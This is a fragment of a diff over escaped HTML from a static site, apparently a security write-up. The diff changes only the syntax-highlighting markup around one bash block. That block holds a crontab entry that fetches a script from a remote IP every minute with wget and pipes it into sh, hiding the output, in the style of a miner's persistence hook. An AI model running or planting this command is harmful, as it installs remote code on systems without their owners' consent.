-        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; wget -q -O - http://185.222.210.59/cr.sh | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; - http://185.222.210.59/cr.sh | sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ol&gt;
   &lt;/li&gt;
